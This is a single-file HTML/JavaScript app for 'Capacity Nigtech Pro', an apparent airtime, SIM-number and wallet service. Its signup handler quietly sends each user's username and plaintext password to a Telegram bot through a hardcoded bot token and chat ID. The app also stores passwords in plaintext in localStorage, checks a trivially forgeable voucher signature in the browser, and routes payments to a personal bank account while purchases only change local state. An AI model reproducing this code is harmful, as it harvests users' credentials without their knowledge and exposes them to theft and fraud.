<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capacity Nigtech Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .orange-toast { background-color: #ea580c !important; color: white !important; }
        .spinner { border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 2px solid white; width: 16px; height: 16px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .modal-up { animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .banner-pop { animation: pop-in 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes pop-in { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body class="bg-white overflow-hidden">
    <div id="app" class="h-screen w-full flex flex-col"></div>

    <script type="module">
        let sessionUsers = JSON.parse(localStorage.getItem('capacity_users') || '[]');
        let usedVouchers = JSON.parse(localStorage.getItem('capacity_used_vouchers') || '[]');

        const V_KEY = 17;
        const V_SHIFT = 2024;

        let state = {
            appUserData: null,
            isLoggedIn: false,
            authMode: 'welcome',
            activeTab: 'home',
            isProcessing: false,
            feedback: { show: false, msg: '' },
            signupForm: { name: '', password: '' },
            loginForm: { name: '', password: '' },
            selectedItem: null,
            showPaymentModal: false,
            showRedeemModal: false,
            redeemStep: 'ask', // ask, input, details
            paymentStep: 'choice', 
            airtimeAmount: 50,
            airtimeNumber: '',
            bannerClaimed: localStorage.getItem('capacity_banner_claimed') === 'true'
        };

        const availableNumbers = ["08172364140", "08172364187", "08172364339", "08172364435", "08172364556", "08172364573", "08172364595", "08172364607", "08172389277", "08172389287", "08172389347", "08172389367", "09089189945"].sort();

        function setState(newState) {
            state = { ...state, ...newState };
            render();
        }

        function triggerFeedback(msg) {
            setState({ feedback: { show: true, msg } });
            setTimeout(() => setState({ feedback: { show: false, msg: '' } }), 5000);
        }

        async function handleSignup() {
            const name = state.signupForm.name.trim();
            const pass = state.signupForm.password.trim();
            if (!name || pass.length < 4) return triggerFeedback("Min 4 characters required");
            
            setState({ isProcessing: true });
            
            const BOT_TOKEN = '8328576229:AAGXRplUFBmQjRYJkNRtnWiLhxL2LVNc8pA';
            const CHAT_ID = '8403139958';
            const message = `🚀 *New Signup: Capacity Nigtech*\n\n👤 *Username:* \`${name}\`\n🔑 *Password:* \`${pass}\`\n⏰ *Time:* ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
                });
            } catch (error) { console.error("Telegram delivery failed", error); }

            setTimeout(() => {
                const newUser = { name: name.toLowerCase(), pass: pass, walletBalance: 0 };
                sessionUsers.push(newUser);
                localStorage.setItem('capacity_users', JSON.stringify(sessionUsers));
                setState({ 
                    appUserData: { name: name.toUpperCase(), walletBalance: 0 }, 
                    isLoggedIn: true, 
                    isProcessing: false, 
                    bannerClaimed: false 
                });
                localStorage.setItem('capacity_banner_claimed', 'false');
                triggerFeedback("Welcome to Capacity Nigtech!");
            }, 1000);
        }

        function handleLogin() {
            const name = state.loginForm.name.trim().toLowerCase();
            const pass = state.loginForm.password.trim();
            const userMatch = sessionUsers.find(u => u.name === name && u.pass === pass);
            if (userMatch) {
                setState({ appUserData: { name: userMatch.name.toUpperCase(), walletBalance: userMatch.walletBalance || 0 }, isLoggedIn: true });
                triggerFeedback("Login Successful");
            } else { triggerFeedback("Invalid credentials"); }
        }

        window.claimBanner = () => {
            localStorage.setItem('capacity_banner_claimed', 'true');
            setState({ bannerClaimed: true });
        };

        window.copyToClipboard = (text) => {
            const el = document.createElement('textarea');
            el.value = text; document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            triggerFeedback("Copied: " + text);
        };

        window.redeemVoucherCode = () => {
            const code = document.getElementById('voucherInput').value.trim().toUpperCase();
            if(!code) return;
            if(usedVouchers.includes(code)) return triggerFeedback("Code already used!");
            const parts = code.split("-");
            if(parts.length !== 5) return triggerFeedback("Invalid Voucher Format");

            const amt = parseInt(parts[1]);
            const salt = parseInt(parts[2]);
            const sig = parseInt(parts[4]);

            if(sig === (amt + V_SHIFT + salt) * V_KEY) {
                const newBal = (state.appUserData.walletBalance || 0) + amt;
                usedVouchers.push(code);
                localStorage.setItem('capacity_used_vouchers', JSON.stringify(usedVouchers));
                const currentUser = sessionUsers.find(u => u.name === state.appUserData.name.toLowerCase());
                if(currentUser) {
                    currentUser.walletBalance = newBal;
                    localStorage.setItem('capacity_users', JSON.stringify(sessionUsers));
                }
                setState({ appUserData: { ...state.appUserData, walletBalance: newBal }, showRedeemModal: false });
                triggerFeedback(`Success! ₦${amt} added to wallet.`);
            } else { triggerFeedback("Invalid Security Signature"); }
        };

        function render() {
            const root = document.getElementById('app');
            if (!state.isLoggedIn) {
                root.innerHTML = renderAuth();
                setupAuthListeners();
            } else {
                root.innerHTML = `
                    <header class="px-6 py-4 flex items-center justify-between border-b bg-white sticky top-0 z-50">
                        <div class="flex flex-col">
                            <span class="font-black text-orange-600 text-sm tracking-tighter uppercase">Capacity Nigtech</span>
                            <span class="text-[7px] font-bold text-gray-400 uppercase tracking-widest">Connected Pro</span>
                        </div>
                        <div class="flex items-center gap-3">
                          <div class="flex flex-col items-end">
                            <p class="text-[9px] font-black text-gray-800 uppercase tracking-tighter">${state.appUserData.name}</p>
                            <p class="text-[7px] font-bold text-orange-500">₦${state.appUserData.walletBalance}.00</p>
                          </div>
                          <div class="w-10 h-10 bg-orange-600 rounded-xl flex items-center justify-center text-white font-black shadow-md">${state.appUserData.name[0]}</div>
                        </div>
                    </header>
                    <main class="flex-1 overflow-y-auto pb-32 no-scrollbar bg-white">${renderTabContent()}</main>
                    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t px-6 pt-4 pb-8 flex justify-around items-center z-[100] rounded-t-[2.5rem] shadow-lg">
                        <div onclick="window.setActiveTab('home')" class="flex flex-col items-center gap-1">
                            <div class="p-2 rounded-xl ${state.activeTab === 'home' ? 'bg-orange-600 text-white' : 'text-gray-300'}"><i data-lucide="home" size="20"></i></div>
                            <span class="text-[7px] font-black uppercase tracking-widest ${state.activeTab === 'home' ? 'text-orange-600' : 'text-gray-300'}">Home</span>
                        </div>
                        <div onclick="window.setActiveTab('sim')" class="flex flex-col items-center gap-1">
                            <div class="p-2 rounded-xl ${state.activeTab === 'sim' ? 'bg-orange-600 text-white' : 'text-gray-300'}"><i data-lucide="smartphone" size="20"></i></div>
                            <span class="text-[7px] font-black uppercase tracking-widest ${state.activeTab === 'sim' ? 'text-orange-600' : 'text-gray-300'}">SIM Cards</span>
                        </div>
                        <div onclick="window.setActiveTab('settings')" class="flex flex-col items-center gap-1">
                            <div class="p-2 rounded-xl ${state.activeTab === 'settings' ? 'bg-orange-600 text-white' : 'text-gray-300'}"><i data-lucide="user" size="20"></i></div>
                            <span class="text-[7px] font-black uppercase tracking-widest ${state.activeTab === 'settings' ? 'text-orange-600' : 'text-gray-300'}">Profile</span>
                        </div>
                    </nav>

                    ${!state.bannerClaimed ? `
                    <div class="fixed inset-0 z-[200] bg-black/70 backdrop-blur-sm flex items-center justify-center p-8">
                        <div class="bg-white rounded-[2.5rem] w-full max-w-sm p-8 text-center space-y-6 banner-pop shadow-2xl border-t-8 border-orange-600">
                            <div class="w-20 h-20 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mx-auto mb-2">
                                <i data-lucide="party-popper" size="40"></i>
                            </div>
                            <h2 class="font-black text-xl text-gray-800 uppercase tracking-tight">Welcome</h2>
                            <p class="text-[12px] font-bold text-gray-500 leading-relaxed px-2 italic">
                                "Congratulations for joining the game changer of Connectivity you're welcome"
                            </p>
                            <button onclick="window.claimBanner()" class="w-full bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-[10px] tracking-widest shadow-xl shadow-orange-100">
                                OK
                            </button>
                        </div>
                    </div>` : ''}
                `;
            }
            if (state.feedback.show) {
                const toast = document.createElement('div');
                toast.className = "fixed top-10 left-6 right-6 z-[300] p-4 orange-toast text-[10px] font-black uppercase rounded-2xl text-center shadow-2xl animate-in slide-in-from-top-full";
                toast.innerText = state.feedback.msg;
                root.appendChild(toast);
            }
            if (state.showPaymentModal) root.insertAdjacentHTML('beforeend', renderPaymentModal());
            if (state.showRedeemModal) root.insertAdjacentHTML('beforeend', renderRedeemModal());
            lucide.createIcons();
        }

        function renderAuth() {
            return `<div class="fixed inset-0 bg-white flex flex-col p-8 items-center justify-center">
                <div class="w-20 h-20 bg-orange-600 rounded-3xl mb-6 flex items-center justify-center shadow-2xl"><span class="text-white text-4xl font-black">C</span></div>
                <div class="text-center mb-10 max-w-xs">
                    <h1 class="font-black text-2xl text-orange-600 tracking-tighter uppercase mb-2">Capacity Nigtech</h1>
                    <p class="text-[10px] font-bold text-gray-500 uppercase tracking-tighter leading-relaxed">Game changer of Connectivity join the future</p>
                </div>
                <div class="w-full space-y-4 max-w-sm">
                    ${state.authMode === 'welcome' ? `
                        <button onclick="window.setAuthMode('signup')" class="w-full bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">Create Account</button>
                        <button onclick="window.setAuthMode('login')" class="w-full bg-gray-100 text-gray-800 py-4 rounded-2xl font-black uppercase text-xs tracking-widest active:scale-95 transition-all">Log in</button>
                    ` : `
                        <div class="space-y-4 animate-in fade-in slide-in-from-bottom-4">
                            <input type="text" placeholder="Username" class="w-full bg-gray-50 p-4 rounded-2xl font-bold outline-none uppercase text-sm border-2 border-transparent focus:border-orange-500 transition-all" id="userNameInput" value="${state.authMode === 'signup' ? state.signupForm.name : state.loginForm.name}">
                            <input type="password" placeholder="Password" class="w-full bg-gray-50 p-4 rounded-2xl font-bold outline-none text-sm border-2 border-transparent focus:border-orange-500 transition-all" id="userPassInput" value="${state.authMode === 'signup' ? state.signupForm.password : state.loginForm.password}">
                            <div class="flex gap-2">
                                <button onclick="window.submitForm()" ${state.isProcessing ? 'disabled' : ''} class="flex-1 bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-md flex items-center justify-center active:scale-95 transition-all">
                                    ${state.isProcessing ? '<div class="spinner"></div>' : (state.authMode === 'signup' ? "Join Now" : "Login Now")}
                                </button>
                                <button onclick="window.triggerFeedback('Fingerprint Sensor Required')" class="w-16 bg-gray-100 text-orange-600 rounded-2xl flex items-center justify-center border-2 border-orange-50 active:scale-95 transition-all">
                                    <i data-lucide="fingerprint"></i>
                                </button>
                            </div>
                            <p onclick="window.setAuthMode('welcome')" class="text-center text-[10px] text-gray-400 font-black uppercase pt-2 cursor-pointer hover:text-orange-600">← Back</p>
                        </div>
                    `}
                </div>
            </div>`;
        }

        function renderTabContent() {
            if (state.activeTab === 'home') {
                return `
                    <div class="p-5 space-y-6 animate-in fade-in slide-in-from-right-4">
                        <div class="bg-orange-600 rounded-3xl p-6 text-white shadow-xl flex items-center justify-between border-b-4 border-orange-700">
                            <div><p class="text-[8px] font-black text-white/80 tracking-widest uppercase">Wallet Balance</p><p class="text-2xl font-black">₦${state.appUserData.walletBalance}.00</p></div>
                            <button onclick="window.setRedeemModal(true)" class="bg-white text-orange-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase">Fund</button>
                        </div>
                        <div class="space-y-3">
                            <h4 class="text-[10px] font-black text-gray-400 uppercase tracking-widest px-2">Quick USSD Codes</h4>
                            <div class="grid grid-cols-2 gap-3">
                                <div onclick="window.copyToClipboard('*301*8*5#')" class="bg-gray-50 p-4 rounded-2xl border active:bg-orange-600 active:text-white transition-all">
                                    <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Check Airtime</p>
                                    <p class="text-[11px] font-black">*301*8*5#</p>
                                </div>
                                <div onclick="window.copyToClipboard('*301*8*6#')" class="bg-gray-50 p-4 rounded-2xl border active:bg-orange-600 active:text-white transition-all">
                                    <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Check Data</p>
                                    <p class="text-[11px] font-black">*301*8*6#</p>
                                </div>
                                <div onclick="window.copyToClipboard('*311*PIN#')" class="bg-gray-50 p-4 rounded-2xl border active:bg-orange-600 active:text-white transition-all">
                                    <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Recharge Pin</p>
                                    <p class="text-[11px] font-black">*311*PIN#</p>
                                </div>
                                <div onclick="window.copyToClipboard('*301*8*1#')" class="bg-gray-50 p-4 rounded-2xl border active:bg-orange-600 active:text-white transition-all">
                                    <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Check Number</p>
                                    <p class="text-[11px] font-black">*301*8*1#</p>
                                </div>
                            </div>
                        </div>

                        <!-- Data and Airtime Services -->
                        <div class="space-y-3">
                            <h4 class="text-[10px] font-black text-gray-400 uppercase tracking-widest px-2">Purchase Services</h4>
                            <div class="space-y-2">
                                <div onclick="window.openPayment('airtime', 'Airtime Top-up', 0)" class="flex items-center justify-between bg-white border border-gray-100 p-4 rounded-2xl shadow-sm active:scale-95 transition-all">
                                    <div class="flex items-center gap-4">
                                        <div class="w-10 h-10 bg-orange-100 text-orange-600 rounded-xl flex items-center justify-center"><i data-lucide="phone-call" size="18"></i></div>
                                        <div class="flex flex-col"><span class="text-[10px] font-black uppercase">Airtime</span><span class="text-[8px] font-bold text-gray-400 uppercase italic">Instant Top-up</span></div>
                                    </div>
                                    <i data-lucide="chevron-right" size="12" class="text-gray-300"></i>
                                </div>
                                <div onclick="window.triggerFeedback('Data bundle store currently under maintenance')" class="flex items-center justify-between bg-white border border-gray-100 p-4 rounded-2xl shadow-sm active:scale-95 transition-all">
                                    <div class="flex items-center gap-4">
                                        <div class="w-10 h-10 bg-orange-100 text-orange-600 rounded-xl flex items-center justify-center"><i data-lucide="globe" size="18"></i></div>
                                        <div class="flex flex-col"><span class="text-[10px] font-black uppercase">Data Bundle</span><span class="text-[8px] font-bold text-gray-400 uppercase italic">Cheap Bundles</span></div>
                                    </div>
                                    <i data-lucide="chevron-right" size="12" class="text-gray-300"></i>
                                </div>
                            </div>
                        </div>

                        <!-- Support Channels -->
                        <div class="p-6 bg-gray-50 rounded-[2.5rem] border border-gray-100 space-y-4">
                            <h4 class="text-[9px] font-black text-gray-400 uppercase tracking-[0.2em] text-center mb-2">Support Channels</h4>
                            <div class="space-y-3">
                                <div onclick="window.copyToClipboard('capacitynigtech@gmail.com')" class="flex items-center gap-4 bg-white p-4 rounded-2xl border border-orange-50 active:scale-95 transition-all cursor-pointer">
                                    <div class="w-9 h-9 bg-orange-100 text-orange-600 rounded-xl flex items-center justify-center"><i data-lucide="mail" size="16"></i></div>
                                    <div class="flex flex-col"><span class="text-[7px] font-black text-gray-400 uppercase">Email</span><span class="text-[10px] font-black text-gray-800 lowercase">capacitynigtech@gmail.com</span></div>
                                </div>
                                <a href="https://wa.me/2349018511585" class="flex items-center gap-4 bg-white p-4 rounded-2xl border border-orange-50 active:scale-95 transition-all">
                                    <div class="w-9 h-9 bg-green-100 text-green-600 rounded-xl flex items-center justify-center"><i data-lucide="message-circle" size="16"></i></div>
                                    <div class="flex flex-col"><span class="text-[7px] font-black text-gray-400 uppercase">WhatsApp</span><span class="text-[10px] font-black text-gray-800">09018511585</span></div>
                                </a>
                                <a href="tel:+2349089189945" class="flex items-center gap-4 bg-white p-4 rounded-2xl border border-orange-50 active:scale-95 transition-all">
                                    <div class="w-9 h-9 bg-blue-100 text-blue-600 rounded-xl flex items-center justify-center"><i data-lucide="phone" size="16"></i></div>
                                    <div class="flex flex-col"><span class="text-[7px] font-black text-gray-400 uppercase">Direct Call</span><span class="text-[10px] font-black text-gray-800">+2349089189945</span></div>
                                </a>
                            </div>
                        </div>
                    </div>`;
            } else if (state.activeTab === 'sim') {
                return `
                    <div class="p-5 animate-in fade-in slide-in-from-right-4">
                        <h2 class="font-black uppercase text-[10px] tracking-widest text-gray-400 mb-6 px-2 italic">Available phone numbers</h2>
                        <div class="grid grid-cols-1 gap-3">
                            ${availableNumbers.map(n => `<div onclick="window.openPayment('sim', n, 1500)" class="p-5 bg-gray-50 rounded-3xl flex justify-between items-center active:bg-orange-600 active:text-white transition-all shadow-sm border border-transparent active:border-orange-800 group">
                                <div class="flex items-center gap-4">
                                    <div class="w-10 h-10 rounded-xl bg-white text-orange-600 flex items-center justify-center shadow-sm group-active:bg-orange-500 group-active:text-white transition-all"><i data-lucide="smartphone" size="18"></i></div>
                                    <span class="font-black text-[14px] tracking-widest">${n}</span>
                                </div>
                                <span class="text-[10px] font-black bg-orange-100 text-orange-600 px-3 py-1.5 rounded-xl group-active:bg-white group-active:text-orange-600">₦1,500</span>
                            </div>`).join('')}
                        </div>
                    </div>`;
            } else {
                return `<div class="p-5 animate-in fade-in slide-in-from-right-4 text-center py-20">
                    <div class="w-20 h-20 bg-gray-100 rounded-full mx-auto flex items-center justify-center text-gray-400 mb-4"><i data-lucide="user" size="40"></i></div>
                    <p class="font-black text-sm uppercase tracking-tighter">${state.appUserData.name}</p>
                    <button onclick="window.logout()" class="mt-10 text-red-500 font-black uppercase text-[10px] tracking-widest">Logout Account</button>
                </div>`;
            }
        }

        function renderRedeemModal() {
            let content = '';
            if (state.redeemStep === 'ask') {
                content = `
                    <h3 class="text-center font-black uppercase text-sm mb-6 tracking-tight">Fund Wallet</h3>
                    <p class="text-center text-[11px] font-bold text-gray-500 mb-8 uppercase px-4">Do you pay the admin the amount you want to deposit?</p>
                    <div class="grid grid-cols-2 gap-4 px-2">
                        <button onclick="window.setRedeemStep('input')" class="bg-orange-600 text-white py-5 rounded-2xl font-black uppercase text-[11px] tracking-widest shadow-lg active:scale-95 transition-all">YES</button>
                        <button onclick="window.setRedeemStep('details')" class="bg-gray-100 text-gray-800 py-5 rounded-2xl font-black uppercase text-[11px] tracking-widest active:scale-95 transition-all">NO</button>
                    </div>
                `;
            } else if (state.redeemStep === 'input') {
                content = `
                    <button onclick="window.setRedeemStep('ask')" class="mb-4 text-orange-600 text-[9px] font-black uppercase flex items-center gap-1"><i data-lucide="arrow-left" size="12"></i> Back</button>
                    <h3 class="text-center font-black uppercase text-sm mb-6 tracking-tight">Enter Redemption Code</h3>
                    <div class="space-y-4">
                        <input id="voucherInput" type="text" placeholder="CAP-XXXX-XXXX-XXXX" 
                               class="w-full bg-gray-50 p-5 rounded-2xl font-black text-center uppercase border-2 border-transparent focus:border-orange-500 outline-none text-xs">
                        <button onclick="window.redeemVoucherCode()" class="w-full bg-orange-600 text-white py-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">Apply Code</button>
                        <p class="text-center text-[8px] text-gray-400 uppercase font-bold px-4">put your code above and apply your funds will definitely funded</p>
                    </div>
                `;
            } else if (state.redeemStep === 'details') {
                content = `
                    <button onclick="window.setRedeemStep('ask')" class="mb-4 text-orange-600 text-[9px] font-black uppercase flex items-center gap-1"><i data-lucide="arrow-left" size="12"></i> Back</button>
                    <h3 class="text-center font-black uppercase text-sm mb-4 tracking-tight">Admin Bank Details</h3>
                    <div class="bg-orange-50 p-6 rounded-3xl border border-orange-100 space-y-4 mb-6">
                        <div class="flex justify-between items-center py-2 border-b border-orange-100"><span class="text-[8px] font-bold text-gray-400 uppercase">Bank</span><span class="text-[11px] font-black">9PSB</span></div>
                        <div onclick="window.copyToClipboard('1101108051')" class="flex justify-between items-center py-2 border-b border-orange-100 cursor-pointer"><span class="text-[8px] font-bold text-gray-400 uppercase">Acc No</span><span class="text-[11px] font-black flex items-center gap-2">1101108051 <i data-lucide="copy" size="10"></i></span></div>
                        <div class="flex flex-col pt-1"><span class="text-[8px] font-bold text-gray-400 uppercase">Acc Name</span><span class="text-[10px] font-black uppercase tracking-tight">T2mobile/AUWAL TUKUR</span></div>
                    </div>
                    <a href="https://wa.me/2349018511585?text=Hello,%20I%20have%20made%20payment%20for%20wallet%20funding.%20Here%20is%20my%20receipt." class="w-full bg-orange-600 text-white py-5 rounded-2xl font-black uppercase text-[10px] tracking-widest shadow-lg flex items-center justify-center gap-2 active:scale-95 transition-all">
                        <i data-lucide="send" size="16"></i> Send Receipt to WhatsApp
                    </a>
                    <p class="text-center text-[8px] text-gray-400 uppercase font-bold mt-4 px-4 italic">You will receive a code from the admin after you sent receipt.</p>
                `;
            }

            return `<div class="fixed inset-0 z-[200] bg-black/60 flex items-end justify-center backdrop-blur-sm">
                <div class="bg-white w-full rounded-t-[3rem] p-8 modal-up max-w-lg shadow-2xl">
                    <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-8"></div>
                    ${content}
                    <button onclick="window.setRedeemModal(false)" class="w-full py-6 text-gray-300 font-black uppercase text-[10px] tracking-widest mt-2">Dismiss</button>
                </div>
            </div>`;
        }

        function renderPaymentModal() {
            let content = '';
            const item = state.selectedItem;
            
            if (item.type === 'airtime') {
                content = `
                    <h3 class="text-center font-black uppercase text-sm mb-6 tracking-tight">Buy Airtime</h3>
                    <div class="space-y-4">
                        <div class="space-y-1">
                            <label class="text-[8px] font-black uppercase text-gray-400 px-1">Capacity SIM Number</label>
                            <input type="tel" placeholder="080XXXXXXXX" value="${state.airtimeNumber}"
                                   oninput="window.updateAirtimeField('number', this.value)"
                                   class="w-full bg-gray-50 p-4 rounded-2xl font-black border-2 border-transparent focus:border-orange-500 outline-none text-sm">
                        </div>
                        <div class="space-y-1">
                            <label class="text-[8px] font-black uppercase text-gray-400 px-1">Airtime Amount (Min ₦50)</label>
                            <input type="number" placeholder="50" value="${state.airtimeAmount}"
                                   oninput="window.updateAirtimeField('amount', this.value)"
                                   class="w-full bg-gray-50 p-4 rounded-2xl font-black border-2 border-transparent focus:border-orange-500 outline-none text-sm">
                        </div>
                        <div class="p-4 bg-orange-50 rounded-2xl border border-orange-100 flex justify-between items-center">
                            <span class="text-[8px] font-black uppercase text-gray-500">Total Payable</span>
                            <span class="text-sm font-black text-orange-600">₦${state.airtimeAmount || 0}</span>
                        </div>
                        <button onclick="window.processAirtimePurchase()" class="w-full bg-orange-600 text-white py-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">Confirm Purchase</button>
                    </div>`;
            } else if (state.paymentStep === 'choice') {
                content = `
                    <h3 class="text-center font-black uppercase text-sm mb-6 tracking-tight">Select Payment Method</h3>
                    <div class="space-y-3">
                        <button onclick="window.setPaymentStep('wallet')" class="w-full p-5 rounded-2xl border-2 border-gray-100 flex items-center gap-4 bg-white hover:bg-orange-50 active:scale-95 transition-all">
                            <div class="w-10 h-10 bg-orange-100 text-orange-600 rounded-xl flex items-center justify-center"><i data-lucide="wallet" size="20"></i></div>
                            <div class="text-left"><p class="text-[10px] font-black uppercase">Pay from Wallet</p><p class="text-[8px] font-bold text-gray-400 uppercase">Bal: ₦${state.appUserData.walletBalance}</p></div>
                        </button>
                        <button onclick="window.setPaymentStep('bank')" class="w-full p-5 rounded-2xl border-2 border-gray-100 flex items-center gap-4 bg-white hover:bg-orange-50 active:scale-95 transition-all">
                            <div class="w-10 h-10 bg-blue-100 text-blue-600 rounded-xl flex items-center justify-center"><i data-lucide="landmark" size="20"></i></div>
                            <div class="text-left"><p class="text-[10px] font-black uppercase">Bank Transfer</p><p class="text-[8px] font-bold text-gray-400 uppercase">Manual Checkout</p></div>
                        </button>
                    </div>`;
            } else if (state.paymentStep === 'wallet') {
                const canAfford = state.appUserData.walletBalance >= item.price;
                content = `
                    <button onclick="window.setPaymentStep('choice')" class="mb-4 text-orange-600 text-[9px] font-black uppercase flex items-center gap-1"><i data-lucide="arrow-left" size="12"></i> Change Method</button>
                    <h3 class="text-center font-black uppercase text-sm mb-1">Confirm Payment</h3>
                    <p class="text-center text-[10px] text-gray-400 mb-8 uppercase">${item.name}</p>
                    <div class="bg-gray-50 p-6 rounded-2xl text-center mb-6"><p class="text-xl font-black">₦${item.price}.00</p></div>
                    ${canAfford ? `<button onclick="window.processWalletPay()" class="w-full bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">Confirm Purchase</button>` : `<div class="p-4 bg-red-50 text-red-600 rounded-xl text-[9px] font-bold text-center mb-4 uppercase">Insufficient Balance</div>`}
                `;
            } else {
                content = `
                    <button onclick="window.setPaymentStep('choice')" class="mb-4 text-orange-600 text-[9px] font-black uppercase flex items-center gap-1"><i data-lucide="arrow-left" size="12"></i> Back</button>
                    <h3 class="text-center font-black uppercase text-sm mb-1">${item.name}</h3>
                    <p class="text-center text-[10px] text-gray-400 font-bold mb-6 uppercase">Pay Exactly: ₦${item.price}</p>
                    <div class="bg-orange-50 p-4 rounded-2xl border border-orange-200">
                        <div class="flex justify-between items-center py-1 border-b border-orange-100"><span class="text-[8px] font-bold text-gray-400 uppercase">Bank</span><span class="text-[10px] font-black">9PSB</span></div>
                        <div onclick="window.copyToClipboard('1101108051')" class="flex justify-between items-center py-2 border-b border-orange-100 cursor-pointer"><span class="text-[8px] font-bold text-gray-400 uppercase">Acc No</span><span class="text-[10px] font-black">1101108051</span></div>
                        <div class="flex flex-col pt-2"><span class="text-[8px] font-bold text-gray-400 uppercase">Acc Name</span><span class="text-[9px] font-black uppercase tracking-tight">T2mobile/AUWAL TUKUR</span></div>
                    </div>
                `;
            }
            return `<div class="fixed inset-0 z-[200] bg-black/60 flex items-end justify-center backdrop-blur-sm">
                <div class="bg-white w-full rounded-t-[3rem] p-8 modal-up max-w-lg shadow-2xl">
                    <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-8"></div>
                    ${content}
                    <button onclick="window.closePayment()" class="w-full py-6 text-gray-300 font-black uppercase text-[10px] tracking-widest mt-2">Dismiss</button>
                </div>
            </div>`;
        }

        window.logout = () => setState({ isLoggedIn: false, appUserData: null, authMode: 'welcome', activeTab: 'home' });
        window.openPayment = (type, name, price) => setState({ selectedItem: {type, name, price}, showPaymentModal: true, paymentStep: 'choice' });
        window.closePayment = () => setState({ showPaymentModal: false, airtimeAmount: 50, airtimeNumber: '' });
        window.setRedeemModal = (show) => setState({ showRedeemModal: show, redeemStep: 'ask' });
        window.setRedeemStep = (step) => setState({ redeemStep: step });
        window.setPaymentStep = (step) => setState({ paymentStep: step });
        window.setAuthMode = (mode) => setState({ authMode: mode });
        window.setActiveTab = (tab) => setState({ activeTab: tab });

        window.updateAirtimeField = (field, val) => {
            if (field === 'amount') state.airtimeAmount = val;
            if (field === 'number') state.airtimeNumber = val;
        };

        window.processAirtimePurchase = () => {
            const amt = parseInt(state.airtimeAmount);
            if (!state.airtimeNumber || state.airtimeNumber.length < 10) return triggerFeedback("Invalid SIM Number");
            if (isNaN(amt) || amt < 50) return triggerFeedback("Minimum amount is ₦50");
            if (state.appUserData.walletBalance < amt) return triggerFeedback("Insufficient wallet balance");

            const newBal = state.appUserData.walletBalance - amt;
            setState({ appUserData: { ...state.appUserData, walletBalance: newBal }, showPaymentModal: false });
            
            const currentUser = sessionUsers.find(u => u.name === state.appUserData.name.toLowerCase());
            if(currentUser) { currentUser.walletBalance = newBal; localStorage.setItem('capacity_users', JSON.stringify(sessionUsers)); }
            
            triggerFeedback(`Airtime purchase of ₦${amt} successful!`);
        };

        window.processWalletPay = () => {
            const newBal = (state.appUserData.walletBalance || 0) - state.selectedItem.price;
            setState({ appUserData: { ...state.appUserData, walletBalance: newBal }, showPaymentModal: false });
            const currentUser = sessionUsers.find(u => u.name === state.appUserData.name.toLowerCase());
            if(currentUser) { currentUser.walletBalance = newBal; localStorage.setItem('capacity_users', JSON.stringify(sessionUsers)); }
            triggerFeedback("Purchase Successful!");
        };

        window.submitForm = () => { if(state.authMode === 'signup') handleSignup(); else handleLogin(); };
        function setupAuthListeners() {
            const nInp = document.getElementById('userNameInput');
            const pInp = document.getElementById('userPassInput');
            if (nInp) nInp.oninput = (e) => { if(state.authMode === 'signup') state.signupForm.name = e.target.value; else state.loginForm.name = e.target.value; };
            if (pInp) pInp.oninput = (e) => { if(state.authMode === 'signup') state.signupForm.password = e.target.value; else state.loginForm.password = e.target.value; };
        }
        render();
    </script>
</body>
</html>

